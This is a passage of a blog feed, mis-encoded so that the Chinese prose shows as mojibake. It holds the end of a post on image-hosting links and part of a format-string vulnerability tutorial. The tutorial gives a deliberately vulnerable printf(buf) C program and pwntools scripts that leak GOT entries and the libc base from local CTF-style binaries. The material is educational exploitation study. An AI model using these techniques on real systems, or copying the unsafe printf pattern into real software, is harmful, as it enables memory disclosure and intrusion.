title="å»è‡ªå·±çš„dnsè§£æå¹³å°"></a>å»è‡ªå·±çš„dnsè§£æå¹³å°</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œçš„ä¸»æœºè®°å½•å¡«å…¥åˆšåˆšä½ è‡ªå®šä¹‰çš„ä¸»æœºå¼€å¤´ï¼Œè®°å½•å€¼å¡«å…¥åˆšåˆšå¤åˆ¶çš„CNAMEï¼Œå°±å¯ä»¥äº†ã€‚</p><h3 id="ä¿®æ”¹upicè®¾ç½®"><a href="#ä¿®æ”¹upicè®¾ç½®" class="headerlink" title="ä¿®æ”¹upicè®¾ç½®"></a>ä¿®æ”¹upicè®¾ç½®</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>å¡«å…¥å³å¯ï¼Œä»¥å‰å†™çš„åšå®¢ï¼Œå›¾ç‰‡çš„é“¾æ¥ä¹Ÿè¦æ”¹ä¸€ä¸‹ï¼Œå°±æ¢å¤åŸæ¥çš„æ ·å­äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ&quot;&gt;&lt;a href=&quot;#ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ&quot; class=&quot;headerlink&quot; title=&quot;ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ&quot;&gt;&lt;/a&gt;ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ&lt;/h1&gt;&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="æ‚é¡¹" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</title>
    <link href="http://chumen77.xyz/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/03/12/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰/</id>
    <published>2020-03-12T13:13:41.000Z</published>
    <updated>2020-04-03T09:00:26.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿™ä¸ªæ¼æ´æ—¶å€™çš„è‡ªå·±æ„Ÿè§‰çš„ç–‘éš¾ç‚¹ï¼Œå’Œåšé¢˜æ—¶å€™çš„ä¸€ç‚¹å°æŠ€å·§ï¼Œè¿™ä¸€ç¯‡ä¸»è¦æ˜¯è®°å½•ç†è®ºã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>åŸºæœ¬æ ¼å¼ï¼š</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>éœ€è¦é‡ç‚¹å…³æ³¨çš„patternï¼š</p><ol><li>parameter ï¼šn$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</li><li>field width ï¼šè¾“å‡ºçš„æœ€å°å®½åº¦</li><li>precision ï¼šè¾“å‡ºçš„æœ€å¤§é•¿åº¦</li><li>lengthï¼Œè¾“å‡ºçš„é•¿åº¦ : <code>hhï¼Œ1-byte ï¼› hï¼Œ2-byte ï¼› l, 4-byte ï¼›ll,8-byte ï¼›</code></li><li>type :<pre><code class="c"> d/iï¼Œæœ‰ç¬¦å·æ•´æ•° uï¼Œæ— ç¬¦å·æ•´æ•° x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯. sï¼Œè¾“å‡ºä»¥null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚ cï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡º pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf(&quot;%p&quot;,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf(&quot;%p&quot;, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚ nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ï¼ˆä»…ä»…æ˜¯åœ¨è¿™ä¸€ä¸ªprintfçš„å‡½æ•°ï¼‰ %ï¼Œ &#39;%&#39;å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚</code></pre></li></ol><p>å‚æ•°ï¼šå°±æ˜¯æ˜¯è¦å¯¹åº”è¾“å‡ºçš„å˜é‡ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ã€‚é‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ª<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>æ‰€æ§åˆ¶ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>æ ¹æ® <strong>cdecl çš„è°ƒç”¨çº¦å®š</strong>,åœ¨è¿›å…¥ printf()  å‡½æ•°ä¹‹å‰,å°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf()  ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°,ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯    % ,å­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚å¦åˆ™,è¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦,è·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚<br>å¦‚ä¸Šå›¾ä¸€æ ·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿ<strong>æ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ã€‚æ­¤æ—¶ä¹Ÿå°±å‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</strong></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ³„éœ²å†…å­˜æ•°æ®"><a href="#æ³„éœ²å†…å­˜æ•°æ®" class="headerlink" title="æ³„éœ²å†…å­˜æ•°æ®"></a>æ³„éœ²å†…å­˜æ•°æ®</h3><h4 id="æ ˆä¸Šçš„æ•°æ®"><a href="#æ ˆä¸Šçš„æ•°æ®" class="headerlink" title="æ ˆä¸Šçš„æ•°æ®"></a>æ ˆä¸Šçš„æ•°æ®</h4><ol><li>åˆ©ç”¨ % order $ p / % order x æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”æ ˆçš„å†…å­˜å€¼ ã€‚(å¸¸ç”¨%p)</li><li>åˆ©ç”¨ % order $ s æ¥è·å–æŒ‡å®šå˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚(è¿™ä¸ªåœ¨åšæŸäº›ctfé¢˜å¾ˆå¥½ç”¨ï¼Œå½“ä¸€ä¸ªç¨‹åºä¸Šæ¥è¯»å–ä¸€ä¸ªflagåˆ°ä¸€ä¸ªä½ç½®ï¼Œç„¶åä½ åœ¨æ ˆä¸Šæ„é€ è¿™ä¸ªä½ç½®ï¼Œç›´æ¥%så°±å‡ºæ¥flagäº†ã€‚)<h4 id="ä»»æ„åœ°å€å†…å­˜"><a href="#ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="ä»»æ„åœ°å€å†…å­˜"></a>ä»»æ„åœ°å€å†…å­˜</h4>å½“æƒ³æ³„éœ²ä»»æ„åœ°å€å†…å­˜çš„æ—¶å€™ï¼Œå°±éœ€è¦<strong>æƒ³åŠæ³•æŠŠåœ°å€å†™å…¥æ ˆä¸­</strong>ã€‚<br>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œå½“å¯æ§çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠæŸä¸ªåœ°å€å†™åˆ°è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸Šï¼Œç„¶åæ‰¾ä¸‹åœ¨è¿™ä¸ªprintfå‡½æ•°ä¸­<strong>å¯¹åº”çš„æ ˆåç§»</strong>ï¼Œç„¶ååœ¨ç”¨ä½ æƒ³ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ï¼ˆ%p/%x/%sï¼‰æ¥æ“ä½œå³å¯ã€‚ç„¶ååœ¨è¿™ä¸ªåœ°æ–¹ï¼Œå…¶æœ‰ä¸ªéš¾ç‚¹å°±æ˜¯<strong>æ‰¾å¯¹åº”çš„æ ˆåç§»</strong>ã€‚åœ¨æˆ‘ä»¬å®é™…ç”¨çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯æ‰¾æ ˆä¸Šçš„æŸä¸ªä½ç½®å¯¹åº”è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œå¹¶ä¸”ä¹Ÿåˆ†ä¸º32ä½äº64ä½ï¼Œå› ä¸ºå…¶ä¼ å‚æ˜¯ä¸ä¸€æ ·çš„ã€‚<h5 id="ç¡®å®šåç§»"><a href="#ç¡®å®šåç§»" class="headerlink" title="ç¡®å®šåç§»"></a>ç¡®å®šåç§»</h5><h6 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>è¿™æ˜¯32ä½çš„æ ˆå¯¹åº”æƒ…å†µï¼Œæ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚å¦‚å›¾ï¼Œå¹¶ä¸”å‘ç°è¿™äº›æŒ‡å®šå‚æ•°çš„ï¼ˆå¦‚%4$x),å…¶å°±æ˜¯å¯¹åº”æ‰¾å¯¹åº”æ ˆä¸Šå†…å®¹ ï¼Œè€Œä¸æŒ‡å®šçš„%xå…¶æ‰¾å¯»æ‰¾çš„æ—¶å€™ï¼Œæ˜¯çœ‹ä¸‹å‰é¢æœ‰ä¸ªå‡ ä¸ªå¯¹åº”çš„æ— æŒ‡å®šæ ¼å¼åŒ–å­—ç¬¦ï¼Œå°±æƒ³å›¾ä¸Šçš„æƒ…å†µï¼Œå†ç»™ä¸€ä¸ª%xå…¶æ˜¯ä¼šæ‰¾åˆ°arg4ã€‚</p><h6 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h6><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>å› ä¸º64ä½çš„å‚æ•°å­˜æ”¾æ˜¯ä¼˜å…ˆå¯„å­˜å™¨(rdi,rsi,rdx,rcx,r8,r9)ï¼Œå æ»¡ä»¥åç¬¬7ä¸ªå‚æ•°æ‰ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è¿™å°±æ˜¯è·Ÿ32ä½æ‰¾åç§»ä¸åŒåœ°æ–¹ã€‚</p><h6 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h6><p>å¯ä»¥ç»™gdbå®‰è£…ä¸€ä¸‹pwndbgï¼Œåœ¨GitHubä¸Šé¢æ‰¾çš„åˆ°ã€‚ç„¶åæ¼”ç¤ºä¸€ä¸‹ï¼š</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdbè°ƒè¯•ï¼Œæ‰¾å›¾ä¸­æ¡†æ¡†çš„æ ˆåœ°å€ï¼Œå¯¹åº”çš„åç§»ï¼š<br>32ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>æ³¨æ„æ˜¯å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ç”¨pwndbgçš„fmtargç¡®å®šåç§»ï¼Œå°±ä¸ç”¨æ‹…å¿ƒæ•°é”™äº†ã€‚</p><h5 id="å†™åœ°å€è¿›æ ˆ"><a href="#å†™åœ°å€è¿›æ ˆ" class="headerlink" title="å†™åœ°å€è¿›æ ˆ"></a>å†™åœ°å€è¿›æ ˆ</h5><p>å­¦ä¼šç¡®å®šåç§»åï¼Œå°±å¯ä»¥å†™åœ°å€è¿›æ ˆï¼Œæ¥å®ç°è¯»ä»»æ„åœ°å€å†…å­˜äº†ã€‚ç»å¸¸ä½¿ç”¨çš„æ˜¯ï¼Œ<strong>æŠŠè¿™ä¸ªç¨‹åºä¸­çš„æŸä¸ªgotåœ°å€å†™è¿›æ ˆï¼Œç„¶åå°±å¯ä»¥äº†æ¥è·å–å…¶å†…å®¹ï¼Œç„¶ååœ¨æ ¹æ®å…¶åœ¨libcä¸­çš„åç§»å°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œè¿›è€Œç®—å‡ºä»»æ„ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼ˆå¦‚systemï¼‰</strong>ã€‚</p><h6 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h6><p>æ ¼å¼ï¼š<code>&lt;address&gt;%&lt;order&gt;$s</code><br>è¿™æ ·å°±å¯ä»¥å°è¯•è¯»å‡ºï¼Œadresså¤„å¯¹åº”çš„å€¼ï¼Œä½†æ˜¯å› ä¸ºæ˜¯%sï¼Œå…¶é‡åˆ°\x00å°±ä¼šç›´æ¥æ–­äº†ï¼Œæ²¡æœ‰æƒ³è¦çš„è¾“å‡ºã€‚æ›´å¸¸æœ‰çš„æƒ…å†µå°±æ˜¯ï¼Œä¼šè¾“å‡ºä¸€å¤§å †ï¼Œç„¶åæˆ‘ä»¬æƒ³è¦çš„åœ°å€æºæ‚åœ¨é‡Œé¢ï¼Œæ‰€ä»¥å¯ä»¥æ”¹è¿›ä¸€ä¸‹ï¼Œå¯ä»¥åŠ ä¸€ç»„æ ‡è®°ï¼Œç„¶åå†å»å–å‡ºæ¥æƒ³è¦ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ¥æ£€æµ‹æ˜¯å¦è¢«\x00æˆªæ–­äº†ã€‚<br>æ”¹è¿›æ ¼å¼ï¼š<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>åœ¨ä½¿ç”¨çš„æ—¶å€™è®°å¾—é™¤å» <strong>&lt; &gt;</strong>ã€‚<br>å®ä¾‹ï¼š</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>è·å–ä¸€ä¸‹gotï¼Œé€‰æ‹©read ï¼š 0x0804a00c ,ç„¶åå€ŸåŠ©pwntoolsï¼š</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>å‘ç°å‡ºç°äº†å¼‚å¸¸ã€‚<br>ä¿®æ”¹ä»£ç ï¼ŒæŸ¥ä¸€ä¸‹readåœ¨libcçš„symbolsï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>å‘ç°å°±æ˜¯å› ä¸ºè¿æ°”ä¸å¥½ï¼Œè¿™ä¸ªlibcç‰ˆæœ¬é‡Œæ­£å¥½readå‡½æ•°æ˜¯00ç»“å°¾çš„ï¼Œæ‰€ä»¥æ¢ä¸€ä¸‹:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>è¿™å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿˜å¯ä»¥çœ‹å‡ºæ¥çš„ç¡®æ˜¯è¾“å‡ºæ¥ä¸€å †ä¸œè¥¿ã€‚</p><h6 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h6><p>åœ¨64ä½ç¨‹åºå½“ä¸­ï¼Œä¸€ä¸ªåœ°å€çš„é«˜ä½å¿…å®šå°±æ˜¯0ï¼Œæ‰€ä»¥<strong>addressæ˜¯ä¸èƒ½å†™åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ€å‰é¢çš„</strong>ï¼Œå¯ä»¥è·Ÿåœ¨fmtåé¢ï¼Œä½†æ˜¯è¿™é‡Œå°±ç‰µæ¶‰åˆ°äº†å­—èŠ‚å¯¹é½é—®é¢˜ï¼Œå¹¶ä¸”å…¶åç§»é‡ç®—èµ·æ¥ï¼Œå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åšpaddingæ—¶ï¼Œåç§»é‡æ—¶ä¼šå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦è€Œå‘ç”Ÿå˜åŒ–çš„ã€‚æ‰€ä»¥è¾ƒå¥½çš„åšæ³•ï¼Œ<strong>å°±æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åšå¥½paddingï¼Œè¿™æ ·è§£å†³äº†å­—èŠ‚å¯¹é½ï¼Œä¹Ÿè§£å†³äº†åç§»é‡çš„è®¡ç®—ã€‚</strong><br>å®ä¾‹ï¼šï¼ˆè¿˜æ˜¯åˆšåˆšçš„ç¨‹åºç¼–è¯‘æˆ64ä½ï¼‰</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>è¿™æ¬¡æŠŠpayloadè¿™æ ·å†™ï¼Œåšå¥½paddingï¼ŒæŠŠaddresså†™åœ¨åé¢ï¼Œæ­¤æ—¶å› ä¸ºåç§»ä¼šå˜ï¼Œgdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œåç§»å˜ä¸ºå¤šå°‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹å‡ºæ¥åç§»ä¸º11ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>å‘ç°å†æ¬¡è¿æ°”ä¸å¥½ï¼Œè¿˜æ˜¯å¾—æ¢ä¸€ä¸ªå‡½æ•°æ‰“å°gotï¼Œæ¢æˆreadï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>è¿™æ ·å°±OKäº†ã€‚</p><h5 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h5><ol><li>ä½¿ç”¨%s è¯»å–å†…å­˜é‡Œçš„ä»»æ„ä½å€ï¼Œ%s ä¼šæŠŠå¯¹åº”çš„å‚æ•°å½“åš <code>char*</code>æŒ‡æ ‡å¹¶å°†ç›®æ ‡åšä¸ºå­—ç¬¦ä¸²å°å‡ºæ¥</li><li>ä½¿ç”¨é™åˆ¶:Stack ä¸Šè¦æœ‰å¯æ§åˆ¶ addres çš„buffer ;æ³¨æ„ç”±äºæ˜¯å½“åšå­—ç¬¦ä¸²æ‰“å°ï¼Œæ‰€ä»¥åˆ° 0 æ—¶å°±ä¼šä¸­æ–­,ä¹Ÿè¦æ³¨æ„32ä½è·Ÿ64ä½addressçš„å†™åœ¨çš„ä½ç½®ã€‚<h5 id="å°æŠ€å·§-1"><a href="#å°æŠ€å·§-1" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>æƒ³è¦æ³„éœ²libcåŸºå€ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡è¿”å›<code>__libc_start_main + x</code>(libcç‰ˆæœ¬ä¸ä¸€æ ·å¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œæœ¬äººæ˜¯ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>ç®—ä¸€ä¸‹åç§»æ˜¯21ã€‚<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>è¿è¡Œè¿™ä¸ªexpæ¥leak libcçš„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>æ³„éœ²stack address ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>æ­£å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œä¼šå‘ç°æ ˆä¸Šè¯´æœ‰å¾ˆå¤šä¸espæ¥è¿‘çš„æ•°æ®ï¼Œåˆ©ç”¨åˆé€‚çš„æ•°æ®æ ¹æ®åç§»å°±ä¼šæ‹¿åˆ°espçš„å€¼ï¼Œç„¶åå°±å¾—åˆ°äº†satck addressã€‚å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯å¤šå±‚å‡½æ•°è°ƒç”¨æ—¶ï¼Œç•™ä¸‹çš„ebpå€¼ã€‚</p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><p>è¦†ç›–å†…å­˜é€šå¸¸å…¶å®å°±æ˜¯æ”¹å†™å†…å­˜ï¼Œå…¶ä¸­åˆ†ä¸º<strong>æ”¹å†™æ ˆä¸Šçš„å†…å­˜å’Œä»»æ„åœ°å€çš„å†…å­˜</strong>ï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ï¼ˆè¿™é‡Œæˆ‘å…ˆåªè®°å½•ä¸€ä¸‹ä»»æ„åœ°å€çš„è¦†ç›–ï¼Œæ”¹å†™æ ˆä¸Šçš„å†…å­˜æš‚æ—¶ç”¨ä¸åˆ°ï¼‰<br>è¿™é‡Œé¢ä¸»è¦æ˜¯ä½¿ç”¨<code>%n</code>, %n  è½¬æ¢æŒ‡ç¤ºç¬¦ä¸è¾“å‡ºå­—ç¬¦ï¼Œå°† å½“å‰printfå‡½æ•°å·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚å…¶æ ¸å¿ƒå°±æ˜¯ï¼š<strong>å†™å…¥çš„å€¼ = å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°</strong> ï¼ŒçŸ¥é“è¿™ä¸ªä»¥åï¼Œå…¶<strong>ä½¿ç”¨èµ·æ¥å°±æ˜¯æ§åˆ¶å¥½åœ¨è¿™æ¬¡%nå‰è¾“å‡ºæ­£ç¡®çš„å­—ç¬¦æ•°</strong>ã€‚</p><h4 id="ä»»æ„åœ°å€è¦†ç›–"><a href="#ä»»æ„åœ°å€è¦†ç›–" class="headerlink" 